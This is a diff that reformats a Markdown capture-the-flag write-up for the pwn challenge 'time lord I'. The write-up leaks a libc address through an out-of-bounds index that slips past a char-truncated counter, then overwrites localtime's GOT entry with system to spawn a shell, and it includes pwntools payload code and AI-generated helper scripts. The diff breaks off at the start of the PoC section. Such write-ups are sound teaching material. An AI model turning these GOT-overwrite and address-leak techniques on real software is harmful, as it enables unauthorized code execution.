@@ -1,8 +1,11 @@
-## challenge: time lord I
-### category: pwn
-### quick look:
+# challenge: time lord I
+
+## category: pwn
+
+## quick look:
 - check mitigation:
-```
+
+```text
     Arch:       amd64-64-little
     RELRO:      Partial RELRO
     Stack:      Canary found
@@ -11,19 +14,23 @@
     SHSTK:      Enabled
     IBT:        Enabled
 ```
+
 - first glance:
-  ```
-	==== TEMPORAL LOOM CONTROL ====
-	1. Inspect Sacred Timeline
-	2. Manually Branch Timeline
-	3. Archive Current Timeline Variant
-	4. Restore Archived Variant
-	5. Prune Timeline (Exit)
-	   >
-  ```
-### decompile:
+
+```text
+    ==== TEMPORAL LOOM CONTROL ====
+    1. Inspect Sacred Timeline
+    2. Manually Branch Timeline
+    3. Archive Current Timeline Variant
+    4. Restore Archived Variant
+    5. Prune Timeline (Exit)
+       >
+```
+
+## decompile:
 - IDA:
-```C
+
+```c
 int __fastcall main_1779(int argc, const char **argv, const char **envp)
 {
   int v4; // [rsp+4h] [rbp-Ch] BYREF
@@ -168,48 +175,57 @@ unsigned __int64 restore_1630()
   return v2 - __readfsqword(0x28u);
 }
 ```
+
 - data stored on BSS:
-  ```
-	.bss:00000000000040A0 ; _QWORD qword_40A0[10]
-	.bss:00000000000040A0 qword_40A0      dq 0Ah dup(?)           ; DATA XREF: archive_154D+99↑o
-	.bss:00000000000040A0                                         ; restore_1630+78↑o
-	.bss:00000000000040F0 dword_40F0      dd ?                    ; DATA XREF: archive_154D+A7↑r
-	.bss:00000000000040F0                                         ; archive_154D+B7↑w
-	.bss:00000000000040F4 dword_40F4      dd ?                    ; DATA XREF: cur_12E1+51↑o
-	.bss:00000000000040F4                                         ; cur_12E1+5F↑r ...
-	.bss:00000000000040F8 ; time_t timer
-	.bss:00000000000040F8 timer           dq ?                    ; DATA XREF: cur_12E1+C↑o
-	.bss:00000000000040F8                                         ; manual_1378+1A9↑w ...
-	.bss:00000000000040F8 _bss            ends
-  ```
-### approach
+
+```text
+    .bss:00000000000040A0 ; _QWORD qword_40A0[10]
+    .bss:00000000000040A0 qword_40A0      dq 0Ah dup(?)           ; DATA XREF: archive_154D+99↑o
+    .bss:00000000000040A0                                         ; restore_1630+78↑o
+    .bss:00000000000040F0 dword_40F0      dd ?                    ; DATA XREF: archive_154D+A7↑r
+    .bss:00000000000040F0                                         ; archive_154D+B7↑w
+    .bss:00000000000040F4 dword_40F4      dd ?                    ; DATA XREF: cur_12E1+51↑o
+    .bss:00000000000040F4                                         ; cur_12E1+5F↑r ...
+    .bss:00000000000040F8 ; time_t timer
+    .bss:00000000000040F8 timer           dq ?                    ; DATA XREF: cur_12E1+C↑o
+    .bss:00000000000040F8                                         ; manual_1378+1A9↑w ...
+    .bss:00000000000040F8 _bss            ends
+```
+
+## approach
 - we got partial relro + some out-of-bounds bugs + NX on -> leak libc + overwrite GOT to get shell via `system("/bin/sh")`
 - there are 4 variables:
-	- qword_40A0: store timestamp
-	- qword_40F0: store num of idx
-	- qword_40F4: store number of negative idx
-	- timer: store chosen timestamp
-#### step 1: leak libc
+  - qword_40A0: store timestamp
+  - qword_40F0: store num of idx
+  - qword_40F4: store number of negative idx
+  - timer: store chosen timestamp
+
+### step 1: leak libc
 - let's check how data is stored:
-  ```gdb
-	...
-	> 1
-	[ Sacred Timeline Status ]
-	Current Timeline: Sun Mar  8 10:38:36 2026
-	Loom condition: Working perfectly fine...
-	...
-	> 3
-	> Select Variant Slot Index: 0
-  ```
+
+```text
+    ...
+    > 1
+    [ Sacred Timeline Status ]
+    Current Timeline: Sun Mar  8 10:38:36 2026
+    Loom condition: Working perfectly fine...
+    ...
+    > 3
+    > Select Variant Slot Index: 0
+```
   
-	![[Pasted image 20260308104522.png]]
+![](../image/Pasted%20image%2020260308104522.png)
+
 - notice the value `0x0000000069acef3c` at `0x5555555580a0`, it's the date I have archived plus the start of timestamp array:
-  ![[Pasted image 20260308104740.png]]
+
+![](../image/Pasted%20image%2020260308104740.png)
+
 - and `0x00000000` & `0x00000001` at `0x5555555580f0` & `0x5555555580f4`, which is number of idx and negative idx
 - head of these are GOT. with OOB bug, we can access and overwrite GOT
 - so we will choose idx = -2 in `restore` func to leak `stdin`, and find libc base:
-  ```C
-  unsigned __int64 restore_1630()
+
+```c
+unsigned __int64 restore_1630()
 {
   ...
   printf("Select Variant Slot Index: ");
@@ -224,38 +240,46 @@ unsigned __int64 restore_1630()
     ++dword_40F4;
   ...
 }
-  ```
+```
+
 - but whenever choose a neg idx, it will increase one at global var `dword_40F4`, and in `inspect` func to print out it checks if there are any neg idx to exit:
-  ```C
+
+```c
   if ( (char)dword_40F4 > 0 )
   {
     printf("Loom condition: %d Singulariy detected. Aborting the Loom...\n", dword_40F4);
     exit('\x137');
   }
-  ```
+```
+
 - however it checks in `char` not `int`, so if restore a large number (0x100), value at `dword_40F4` will still be 0
 - so payload:
-  ```python
-	for i in range(256):
-		p.sendlineafter(b'> ', b'4')
-		p.sendlineafter(b'Select Variant Slot Index: ', b'-2')
-	
-	p.sendlineafter(b'> ', b'1')
-	p.recvuntil(b'Current Timeline: ')
-  ```
+
+```python
+    for i in range(256):
+        p.sendlineafter(b'> ', b'4')
+        p.sendlineafter(b'Select Variant Slot Index: ', b'-2')
+    
+    p.sendlineafter(b'> ', b'1')
+    p.recvuntil(b'Current Timeline: ')
+```
+
 - here how data is leaked:
-  ```DEBUG
+
+```text
 [DEBUG] Received 0x75 bytes:
     b'\n'
     b'[ Sacred Timeline Status ]\n'
     b'Current Timeline: Wed Feb 16 07:59:12 4231098\n'
     b'\n'
     b'Loom condition: Working perfectly fine...\n'
-  ```
+```
+
 - bc it is converted in `inspect` func, so we have to write script to convert back to hex
 - script (gen by AI):
-  ```python
-  def to_timestamp(year, month, day, hour, minute, second):
+
+```python
+def to_timestamp(year, month, day, hour, minute, second):
     month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
     def leap(y):
         return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)
@@ -296,24 +320,30 @@ def leak_addr():
     log.success(f"Base Address (Masked): {hex(base_addr)}")
 
     return base_addr
-  ```
-- prompt: `viết script đổi timestamp sang hex, ví dụ: b'Current Timeline: Mon May  2 17:58:40 3358208\n' = 0x00006053b5ffb0e0, xử lý lỗi out of range cho biến year`
+```
+
+- prompt: `viết script đổi timestamp sang hex, ví dụ: b'Current Timeline: Mon May  2 17:58:40 3358208\n' = 0x00006053b5ffb0e0, xử lý lỗi out of range cho biến year`
 - find offset of `stdin` and got:
-  ```python
-	libc_base = leak_addr() - 0x203000
-	log.info(f"Leaked libc base: {hex(libc_base)}")
-  ```
+
+```python
+    libc_base = leak_addr() - 0x203000
+    log.info(f"Leaked libc base: {hex(libc_base)}")
+```
+
 - res:
-  ```DEBUG
+
+```text
 [*] raw leak: Wed Feb 16 07:59:12 4231098
 [+] Recovered Address (Hex): 0x7961342038e0
 [+] Base Address (Masked): 0x796134203000
 [*] Leaked libc base: 0x796134000000
-  ```
-#### step 2: overwrite GOT
+```
+
+### step 2: overwrite GOT
 - in `inspect` func:
-  ```C
-  int cur_12E1()
+
+```c
+int cur_12E1()
 {
   char *v0; // rax
   const struct tm *tp; // [rsp+8h] [rbp-8h]
@@ -323,13 +353,15 @@ def leak_addr():
   v0 = asctime(tp);
   ...
 }
-  ```
+```
+
 - the idea is to overwrite localtime.got with system.plt, timer = "/bin/sh\x00" via `manual` func
 - we can overwrite with idx from timestamp array to localtime.got (idx = -20) by converting hex to date (with script)
 - off cal: `pwndbg> p (0x5555555580a0-0x555555558000)/8            $2 = 20`
 - script (gen by AI):
-  ```python
-  def generate_time_payload(target_val, is_remote=False):
+
+```python
+def generate_time_payload(target_val, is_remote=False):
     TZ_OFFSET = 0 if is_remote else 7 * 3600 
     target_sec = target_val + TZ_OFFSET
     
@@ -378,28 +410,34 @@ def set_timer(val, is_remote=False):
     p.sendlineafter(b'Hour: ',   str(h).encode())
     p.sendlineafter(b'Minute: ', str(m).encode())
     p.sendlineafter(b'Second: ', str(s).encode())
-  ```
+```
+
 - prompt: `viết hàm để chuyển các giá trị hex như địa chỉ system thành thời gian`
 - as it alr use pointer to timer here `tp = localtime(&timer);`, so we only need to set timer = b'/bin/sh\x00'
 - payload:
-  ```python
-	system = libc_base + 0x58750
-	bin_sh = b'/bin/sh\x00'
-	bin_sh = u64(bin_sh)
-	
-	set_timer(system)
-	p.sendlineafter(b'> ', b'3')
-	p.sendlineafter(b'Slot Index: ', b'-20')
-	set_timer(bin_sh)
-	p.sendlineafter(b'> ', b'3')
-	p.sendlineafter(b'Slot Index: ', b'0')
-  ```
+
+```python
+    system = libc_base + 0x58750
+    bin_sh = b'/bin/sh\x00'
+    bin_sh = u64(bin_sh)
+    
+    set_timer(system)
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Slot Index: ', b'-20')
+    set_timer(bin_sh)
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Slot Index: ', b'0')
+```
+
 - finally ret to `inspect` to get shell and flag:
+
 ```python
 p.sendlineafter(b'> ', b'1')
 p.sendline(b'env')
 ```
-### PoC
+
+## PoC
+
 ```python
 #!/usr/bin/env python3
 from pwn import *
